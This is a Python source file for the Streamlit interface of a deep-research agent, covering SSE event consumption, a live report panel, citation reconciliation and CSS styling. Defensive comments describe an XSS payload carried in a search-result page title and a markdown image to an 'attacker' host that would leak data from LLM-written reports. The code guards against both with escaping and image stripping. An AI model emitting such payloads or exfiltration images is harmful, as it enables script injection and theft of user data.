"""研知 · Deep Research Agent —— Streamlit 界面（事件契约的首个消费端）。

为什么是"后台线程 + 事件队列轮询"：Streamlit 每次交互都会重跑整个脚本，
同步跑长任务会把页面锁死——老项目踩过的坑，这里复用"后台任务 + 轮询"
模式，只是数据源从 HTTP 轮询换成了进程内事件队列（QueueSink）。

D8 起有两种数据源（UI_MODE 开关，PLAN §3.1 三端共用契约）：
  - gateway（默认）：读 FastAPI SSE 网关，UI 是纯 HTTP 客户端——
    与 Next.js 消费同一条流，这是"三端共用契约"叙事的主路径；
  - inline：进程内直调 run_research（D5 原模式，SSE 卡壳时的砍线兜底）。
两种模式喂给 UI 的都是同一个 QueueSink，live_panel 一行不用改。

视觉（D11+）：深色研究台风格，设计参照 GPT Researcher（深色 + teal 强调、
"输入 → 实时进度 → 报告"三段向导流）与 Streamlit 官方 theming 指南；
主题色在 .streamlit/config.toml，组件级样式在本文件的 _CSS。
事件消费逻辑与样式完全分离——改样式不许碰 drain 循环。

启动（项目根目录，gateway 模式先起网关）：
    /opt/anaconda3/envs/agent-research/bin/uvicorn api.main:app --port 8000
    /opt/anaconda3/envs/agent-research/bin/streamlit run frontend/app.py
"""
from __future__ import annotations

import html
import json
import os
import queue
import re
import sys
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # streamlit 只加脚本目录进 sys.path

import requests  # noqa: E402
import streamlit as st  # noqa: E402

from app.config import get_settings  # noqa: E402
from app.contracts import (  # noqa: E402
    EVENT_DONE,
    EVENT_ERROR,
    EVENT_REPORT_DELTA,
    EVENT_REPORT_RESET,
    EVENT_RESEARCH_STARTED,
    AgentEvent,
)
from app.graph.build import run_research  # noqa: E402

UI_MODE = os.getenv("UI_MODE", "gateway")  # gateway | inline
GATEWAY_URL = os.getenv("GATEWAY_URL", "http://127.0.0.1:8000").rstrip("/")

# 报告渲染前剥 markdown 图片：`![alt](url)` 与 HTML img 一律屏蔽
_IMG_RE = re.compile(r"!\[[^\]]*\]\([^)]*\)")

st.set_page_config(page_title="研知 · Deep Research Agent", page_icon="🔬", layout="wide")

# 组件级样式（第二轮：Linear 式克制暗色——近黑底、灰阶层次、发丝边框、
# 唯一 teal 强调只给交互件；删渐变/胶囊/emoji，字号与留白做层次）。
# 选择器绑定 Streamlit 官方 data-testid，升级 Streamlit 时只需对表。
_CSS = """
<style>
  /* 排版：紧凑顶部、56rem 阅读宽度 */
  .block-container { padding-top: 2.4rem; padding-bottom: 3rem; max-width: 58rem; }

  /* 标题：字号做层次，不靠色块 */
  .app-title { font-size: 1.4rem; font-weight: 650; letter-spacing: -0.02em;
               color: #F7F8F8; margin: 0; }
  .app-title em { font-style: normal; color: #3ECFBB; }
  .app-sub { font-size: .86rem; color: #8A8F98; margin: .3rem 0 0; }

  /* 面板/卡片：发丝边框、微亮一档 */
  [data-testid="stVerticalBlockBorderWrapper"] {
    background: #131416 !important; border: 1px solid #232527 !important;
    border-radius: 8px;
  }

  /* 输入框：静默态融入底色，聚焦才亮边 */
  [data-testid="stTextInputField"] {
    background: #0F1011; border: 1px solid #2A2C2E; border-radius: 8px; color: #EDEDEF;
  }
  [data-testid="stTextInputField"]:focus { border-color: #1FA595; box-shadow: none; }

  /* 主按钮：纯色、小圆角、无演出 */
  .stButton > button {
    width: 100%; border: none; border-radius: 8px; font-weight: 550;
    background: #1FA595; color: #08110F;
  }
  .stButton > button:hover:not(:disabled) { background: #24B7A5; }
  .stButton > button:disabled { background: #1B1D1F; color: #5A5F66; }

  /* 状态：小圆点 + 灰字（Linear 式） */
  .status { font-size: .85rem; color: #A8ADB4; display: inline-flex;
            align-items: center; gap: .45rem; }
  .dot { width: 7px; height: 7px; border-radius: 50%; display: inline-block; }
  .dot-run { background: #E2B93B; } .dot-ok { background: #4CB782; }
  .dot-err { background: #EB5757; } .dot-idle { background: #4A4D52; }
  .status b { color: #EDEDEF; font-weight: 550; }

  /* 来源点：kb/web 各一枚 muted 小圆点 */
  .src-dot { width: 6px; height: 6px; border-radius: 50%;
             display: inline-block; margin-right: .45rem; vertical-align: middle; }
  .src-kb { background: #A78BFA; } .src-web { background: #60A5FA; }

  /* 事件流：等宽、灰阶、warn/err 微着色 */
  .ev { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: .74rem;
        color: #7D828A; padding: .1rem 0; display: block; white-space: nowrap;
        overflow: hidden; text-overflow: ellipsis; }
  .ev b { color: #B9BEC6; font-weight: 500; }
  .ev-warn, .ev-warn b { color: #C8A94E; }
  .ev-err, .ev-err b { color: #E07A6E; }

  /* 指标：数字大、标签小、无卡片堆砌 */
  .stats { display: flex; gap: 2.4rem; margin: .1rem 0 .5rem; }
  .stats div b { display: block; font-size: 1.3rem; font-weight: 600;
                 color: #F7F8F8; letter-spacing: -0.01em; }
  .stats div span { font-size: .72rem; color: #8A8F98; }

  /* 侧栏：近乎隐形 */
  [data-testid="stSidebar"] { background: #0C0D0E; border-right: 1px solid #1F2124; }
  [data-testid="stSidebar"] .sect { font-size: .68rem; letter-spacing: .1em;
                                    color: #6B6F76; text-transform: uppercase;
                                    margin: 0 0 .45rem; }
  [data-testid="stSidebar"] .kv { font-family: ui-monospace, Menlo, monospace;
                                  font-size: .78rem; color: #A8ADB4; margin: .18rem 0; }
  [data-testid="stSidebar"] .kv b { color: #EDEDEF; font-weight: 500; }
  [data-testid="stSidebar"] hr { margin: .9rem 0; border-color: #1F2124; }

  /* 报告排版：阅读优先 */
  [data-testid="stMarkdownContainer"] p { line-height: 1.78; }
  [data-testid="stVerticalBlockBorderWrapper"] p { color: #D6D9DD; }

  /* 屏蔽官方 skills 推广 toast：容器以不可见锚条拦截整页指针事件，
     输入框/按钮全部"点了没反应"（实机抓过）。本应用不用 st.toast()。 */
  [data-testid='stToast'], [data-testid='stToastContainer'], div[class*='stToast'] {
    display: none !important;
  }
</style>
"""
st.markdown(_CSS, unsafe_allow_html=True)


class QueueSink:
    """把图的事件流推进线程安全队列，UI 端轮询消费（跨线程的事件契约）。"""

    def __init__(self) -> None:
        self.q: queue.Queue[AgentEvent] = queue.Queue()

    def emit(self, event: AgentEvent) -> None:
        self.q.put(event)


def _consume_gateway(question: str, focus: str, sink: QueueSink) -> None:
    """SSE 客户端：把网关下发的契约事件逐帧转回 AgentEvent 推进队列。

    为什么逐行解析而不是引 SSE 库：协议就一行一个 `data: {json}`，
    三十行代码换零依赖，冲刺期划算。任何传输层异常都转成 EVENT_ERROR
    入队——UI 的终止逻辑只认事件，不感知传输细节（与 inline 模式对称）。
    """
    try:
        resp = requests.post(
            f"{GATEWAY_URL}/api/research",
            json={"question": question, "focus": focus},
            stream=True,
            timeout=(3, None),  # 读超时必须放开：研究是分钟级长流
        )
        resp.raise_for_status()
        for line in resp.iter_lines(decode_unicode=True):
            if not line.startswith("data: "):
                continue
            data = json.loads(line[len("data: ") :])
            sink.emit(
                AgentEvent(
                    type=data["type"], payload=data.get("payload", {}), ts=data.get("ts", 0.0)
                )
            )
    except requests.RequestException as exc:
        sink.emit(
            AgentEvent(
                EVENT_ERROR,
                {
                    "code": "gateway_unreachable",
                    "msg": f"网关不可达（{type(exc).__name__}）：先启动 "
                    f"uvicorn api.main:app（GATEWAY_URL={GATEWAY_URL}），"
                    "或把 UI_MODE 改为 inline 直调进程内图",
                },
            )
        )


for key, default in {
    "thread": None,
    "sink": None,
    "report_text": "",
    "done": False,
    "error": None,
    "mode": "",
    "round_n": 0,
    "events": [],
    "citation": None,
}.items():
    if key not in st.session_state:
        st.session_state[key] = default

# ============ 侧栏：运行配置与快捷入口（纯展示，随交互刷新） ============
with st.sidebar:
    st.markdown('<p class="app-title">研知</p><p class="app-sub">把 RAG 变成 Agent 的研究台</p>',
                unsafe_allow_html=True)
    st.divider()
    settings = get_settings()
    st.markdown('<p class="sect">运行配置</p>', unsafe_allow_html=True)
    st.markdown(
        f'<p class="kv">取证链路 <b>{settings.provider_mode}</b></p>'
        f'<p class="kv">数据源 <b>{UI_MODE}</b></p>'
        f'<p class="kv">追踪 <b>{"开" if settings.tracing_enabled else "关"}</b></p>'
        f'<p class="kv">回环上限 <b>{settings.max_rounds} 轮</b></p>',
        unsafe_allow_html=True,
    )
    st.divider()
    st.link_button("打开 Langfuse 追踪", "https://cloud.langfuse.com", use_container_width=True)
    st.caption("研究结束后 trace 数秒内可见")
    st.divider()
    st.caption("输入后按 Enter 提交文字，按钮解锁后再点「开始研究」")

# ============ 主区：标题 → 输入卡 → 实时面板 ============
st.markdown(
    '<p class="app-title">研知 <em>·</em> Deep Research Agent</p>'
    '<p class="app-sub">私有库与公网双源取证 · 验证回环 · 带引用报告</p>',
    unsafe_allow_html=True,
)

question = st.text_input(
    "研究问题",
    placeholder="例：LangGraph 和手写 Agent 循环哪个更适合生产？",
)
focus = st.text_input("关注点（可选）", placeholder="例：本地 CPU 部署；重点看混合检索")
running = st.session_state.thread is not None and st.session_state.thread.is_alive()
if st.button("开始研究", type="primary", disabled=running or not question.strip()):
    st.session_state.sink = QueueSink()
    st.session_state.report_text = ""
    st.session_state.done = False
    st.session_state.error = None
    st.session_state.mode = ""
    st.session_state.round_n = 0
    st.session_state.events = []
    st.session_state.citation = None
    # UI_MODE 决定数据源：gateway=SSE 客户端（主路径），inline=进程内直调（砍线兜底）。
    # 两个 target 的签名刻意对齐（question, focus, sink），切换零胶水
    target = _consume_gateway if UI_MODE == "gateway" else run_research
    st.session_state.thread = threading.Thread(
        target=target,
        args=(question.strip(), focus.strip(), st.session_state.sink),
        daemon=True,
    )
    st.session_state.thread.start()


def _event_line(event: AgentEvent) -> str:
    """事件流单行 HTML：来源小圆点 + 灰阶等宽（纯展示）。

    所有动态字段必须过 html.escape 再拼：本函数的返回值以
    unsafe_allow_html=True 上屏，而 payload.title 直接来自公网搜索结果
    （攻击者可控文本）——不转义就是把外网 HTML 当代码执行（评审 P0-1：
    恶意页面 <title><img onerror=…></title> → 搜索结果 → 本函数 → JS 弹窗，
    五环全通）。eid 今天虽由服务端生成，仍统一转义，防止契约演进后漏防。
    """
    p = event.payload
    if event.type == "evidence_added":
        src = "kb" if p.get("source_type") == "kb" else "web"
        dot = "src-kb" if src == "kb" else "src-web"
        eid = html.escape(str(p.get("eid", "?")))
        title = html.escape(str(p.get("title", ""))[:46])
        return (
            f'<span class="ev"><b>[{eid}]</b>'
            f'<span class="src-dot {dot}"></span>'
            f"{title}</span>"
        )
    color = {"warning": "ev-warn", "error": "ev-err"}.get(event.type, "")
    kind = html.escape(str(event.type))
    detail = html.escape(str(event.payload)[:90])
    return f'<span class="ev {color}"><b>[{kind}]</b> {detail}</span>'


@st.fragment(run_every="1s")
def live_panel() -> None:
    """每秒取空事件队列：报告逐字增长，过程事件即时可见。

    所有容器必须在 fragment 【内部】创建：Streamlit 1.66 起 fragment 写
    外部容器直接抛 StreamlitInvalidLayoutContextError（实机红条）。
    数据全部存 session_state，fragment 每秒从 state 重绘，无跨域写。"""
    status_ph = st.empty()
    mode_ph = st.empty()
    report_ph = st.empty()
    side_ph = st.container()

    sink = st.session_state.sink
    if sink is None:
        status_ph.markdown(
            '<span class="status"><i class="dot dot-idle"></i>输入研究问题，点「开始研究」</span>',
            unsafe_allow_html=True,
        )
        return
    while True:
        try:
            event = sink.q.get_nowait()
        except queue.Empty:
            break
        if event.type == EVENT_REPORT_DELTA:
            st.session_state.report_text += str(event.payload.get("text", ""))
        elif event.type == EVENT_REPORT_RESET:
            # 流式断流降级的清场信号：残文不清，降级全文就会拼在半截后面
            st.session_state.report_text = ""
            st.session_state.events.append(event)
        elif event.type == EVENT_DONE:
            st.session_state.done = True
            st.session_state.citation = event.payload.get("citation_report")
        elif event.type == EVENT_RESEARCH_STARTED:
            st.session_state.mode = str(event.payload.get("provider_mode", ""))
            st.session_state.events.append(event)
        elif event.type == "round_started":
            st.session_state.round_n = int(event.payload.get("round", 0))
            st.session_state.events.append(event)
        elif event.type == EVENT_ERROR:
            # 后台线程崩掉时这是唯一能到达 UI 的失败信号（评审 P0-3）；
            # 同时进 events 列表，让过程面板里也能看到错误现场
            st.session_state.error = str(event.payload.get("msg", "未知错误"))
            st.session_state.events.append(event)
        else:
            st.session_state.events.append(event)

    alive = st.session_state.thread is not None and st.session_state.thread.is_alive()

    # ---- 状态行（小圆点 + 灰字）+ 回环进度（MAX_ROUNDS 熔断可视化）----
    n_events = len(st.session_state.events)
    n_chars = len(st.session_state.report_text)
    if st.session_state.error:
        status_ph.markdown(
            f'<span class="status"><i class="dot dot-err"></i>研究失败 · '
            f"{html.escape(st.session_state.error[:120])}</span>",
            unsafe_allow_html=True,
        )
    elif st.session_state.done:
        status_ph.markdown(
            '<span class="status"><i class="dot dot-ok"></i><b>研究完成</b></span>',
            unsafe_allow_html=True,
        )
    elif alive:
        status_ph.markdown(
            f'<span class="status"><i class="dot dot-run"></i>研究中 · 第 '
            f'{st.session_state.round_n} 轮 · {n_events} 事件 · 报告 {n_chars} 字</span>',
            unsafe_allow_html=True,
        )
    else:
        status_ph.markdown(
            '<span class="status"><i class="dot dot-idle"></i>输入研究问题，点「开始研究」</span>',
            unsafe_allow_html=True,
        )
    if alive and st.session_state.round_n:
        status_ph.progress(min(st.session_state.round_n / max(get_settings().max_rounds, 1), 1.0))

    # fake 模式的证据长得跟真的一样（example.com 除外），不讲明来源，
    # 现场演示忘切配置就会拿固定台词当真数据（评审 P2-10）
    if st.session_state.mode == "fake":
        mode_ph.markdown(
            '<span class="status"><i class="dot dot-run"></i>离线演示模式'
            "（PROVIDER_MODE=fake）：证据与报告来自固定示例数据</span>",
            unsafe_allow_html=True,
        )
    else:
        mode_ph.empty()

    # ---- 引用对账（Linear 式数字组；unmapped=幻觉引用直接曝光）----
    if st.session_state.citation:
        c = st.session_state.citation
        verdict = "全部映射" if not c["unmapped"] else f"未映射 {len(c['unmapped'])} 个"
        st.markdown(
            '<div class="stats">'
            f"<div><b>{c['refs_total']}</b><span>引用出现</span></div>"
            f"<div><b>{c['refs_unique']}</b><span>去重编号</span></div>"
            f"<div><b>{c['mapped']}</b><span>可映射</span></div>"
            f"<div><b>{c['evidence_total']}</b><span>证据</span></div>"
            f"<div><b>{verdict}</b><span>对账结论</span></div>"
            "</div>",
            unsafe_allow_html=True,
        )
        if c["unmapped"]:
            st.error(f"幻觉引用（编号不在证据册里）：{c['unmapped']}")

    # ---- 报告文档卡（流式打字机）----
    if st.session_state.report_text:
        tail = " ▌" if alive and not st.session_state.done else ""
        # 剥外链图片语法再渲染：报告由不可信网页喂出来的 LLM 生成，
        # 一张 ![](http://attacker/pixel?data=...) 就是现成的数据外泄通道（评审 P2-13）
        with report_ph.container(border=True):
            st.markdown(
                '<span class="status"><b>报告</b></span>', unsafe_allow_html=True
            )
            st.markdown(
                _IMG_RE.sub("[图片已屏蔽]", st.session_state.report_text) + tail,
                unsafe_allow_html=False,
            )

    # ---- 过程事件流（等宽着色，最近 25 条）----
    with side_ph, st.expander(
        "⚙️ 研究过程事件（实时）", expanded=alive and not st.session_state.done
    ):
        for event in st.session_state.events[-25:]:
            st.markdown(_event_line(event), unsafe_allow_html=True)


live_panel()
